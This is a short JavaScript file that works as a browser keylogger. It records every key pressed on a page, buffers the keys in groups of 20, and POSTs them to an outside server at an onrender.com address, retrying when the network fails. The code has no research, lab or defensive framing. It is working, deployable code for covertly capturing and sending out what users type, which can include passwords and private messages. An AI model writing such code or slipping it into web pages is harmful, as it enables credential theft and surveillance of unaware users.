let keyPressQueue = []; // Queue to store keypress data
let isSending = false; // Flag to track if data is being sent
let retryCount = 0; // Counter to track retry attempts
const maxRetries = 5; // Maximum number of retries

// Listen for keydown events and log the input
document.addEventListener("keydown", (event) => {
  keyPressQueue.push(event.key); // Add the key press to the queue

  // Check if the queue length has reached the threshold
  if (keyPressQueue.length >= 20) { // Adjust the threshold as needed
    processQueue(); // Start processing the queue
  }
});

// Function to process the queue and send data synchronously
async function processQueue() {
  if (isSending || keyPressQueue.length < 20) {
    return; // Exit if already sending or queue is empty
  }

  isSending = true; // Set the sending flag
  const dataToSend = keyPressQueue.join(''); // Combine all keypresses in the queue

  try {
    const response = await fetch('https://backendservice-1.onrender.com/data', { // Replace with your server URL
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ data: dataToSend }), // Wrap data in an object
    });

    if (!response.ok) {
      throw new Error(`Server error: ${response.status}`);
    }

    const responseData = await response.text(); // Read the response as plain text
    console.log('Data sent successfully:', responseData);

    keyPressQueue = []; // Clear the queue after successful send
    isSending = false; // Reset the sending flag
    retryCount = 0; // Reset retry count after a successful send
  } catch (error) {
    // Retry only for network-related errors
    if (
      retryCount < maxRetries &&
      (error.name === 'TypeError' || error.message.includes('NetworkError') || error.message.includes('Failed to fetch'))
    ) {
      retryCount++;
      setTimeout(() => {
        isSending = false; // Reset the sending flag to retry
        processQueue(); // Retry sending the data
      }, 5000); // Retry after 5 seconds
    } else {
      console.error('Error sending data:', error); // Log the error for debugging
      isSending = false; // Reset the sending flag
      retryCount = 0; // Reset retry count
    }
  }
}